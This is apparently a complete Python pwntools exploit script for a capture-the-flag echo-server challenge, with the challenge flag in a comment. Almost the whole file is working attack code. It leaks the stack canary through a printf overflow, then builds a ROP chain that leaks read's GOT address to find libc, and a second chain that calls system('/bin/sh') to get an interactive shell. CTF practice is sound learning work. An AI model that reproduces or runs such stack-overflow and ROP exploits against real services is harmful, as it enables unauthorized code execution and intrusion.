#!/usr/bin/env python
# -*- coding: utf-8 -*-
from pwn import *

# CGCTF{It'5_ju5t_4_s1mp13_3ch0_server_r1ght?}

host = "pwn.yuawn.idv.tw"
port = 10104
#host = '192.168.31.140'
#host = '172.16.115.109'


yuan = remote(host,port)


pop_rdi = 0x0000000000400923
#bin_sh_libc = 0x18c58b
bin_sh_libc = 0x18cd17
puts_plt = 0x400600
read_GOT = 0x601038
#read_libc = 0xf69a0
read_libc = 0xf7220
printf_GOT = 0x601028
#libc_printf_offset = 0x557b0
libc_printf_offset = 0x55800
#libc_system_offset = 0x45380
libc_system_offset = 0x45390
main = 0x40078d

log.info("Step 1: Use printf() to leak somthing.")
p = 'a' * 137
print "%%% Payload 1 -> " + p
yuan.recvuntil(':')
yuan.send(p)
yuan.recvuntil('echo')
output = yuan.recvuntil('I')
#print "Print:" , output
canary_5858 = output[138:-1]
#canary = canary_5858[:-(len(canary_5858)-7)]
canary = canary_5858[:7]
print
print "===========step1 results==============="
log.success("Printf leak -> {}".format(canary_5858))
log.success("Canary -> {}".format(canary))
print "===========step1 results==============="
print

log.info("Step 2: At this point, we can use canary we obtained after the first overflowing to overflow return address , thus we can use ROPgadgets.")
print "%%% And use those skills to set up parameters for some function on @.plt which you want to use."
print "%%% Then try to caculate the real address of system function in libc."
print "%%% In this situation , I try to use puts@.plt to dump somethings from address of read@.got."
print "%%% The important thing is that , for payload 2 we use it in (exit) condition , so it work after the end of main(), therefor we have to push main() address on the stack for us to return to main() again."

p2 = 'exit' + "A"*132
p2 += '\x00'
p2 += canary
p2 += 'BBBBBBBB' * 2
p2 += "RBBBBBBP"
p2 += p64(pop_rdi)
p2 += p64(read_GOT)
p2 += p64(puts_plt)
p2 += p64(main)

print "%%% Payload 2 -> " + p2

yuan.send(p2)
print
print "===========step2 results==============="
yuan.recvuntil('~\n')
puts = yuan.recvuntil('\n')
log.success("Call puts@plt's stdout -> {}".format(puts))
#hh = ''.join(hex(ord(c)).replace('0x','') for c in puts[:-1][::-1])
irhh = u64(puts[:-1].ljust(8,chr(0)))

libc_addr = irhh - read_libc
system_addr = libc_addr + libc_system_offset
bin_sh_addr = libc_addr + bin_sh_libc

log.success("read_address -> {}".format(hex(irhh)))
log.success("Libc_address -> {}".format(hex(libc_addr)))
log.success("System_address -> {}".format(hex(system_addr)))
log.success("bin_sh_addr -> {}".format(hex(bin_sh_addr)))
print "===========step2 results==============="
print
log.info("Step 3: We got all stuffs we needed for calling syscall with the first x64 parameter $rdi =['/bin/sh'] , so ROP again to execve a shell.")

p3 = 'exit' + "A"*132
p3 += '\x00'
p3 += canary
p3 += "BBBBBBBB" * 2
p3 += "RBBBBBBP"
p3 += p64(pop_rdi)
p3 += p64(bin_sh_addr)
p3 += p64(system_addr)

print "%%% Payload 3 -> " + p3
print
log.critical("Got a shell!")
print

yuan.send(p3)

yuan.interactive()
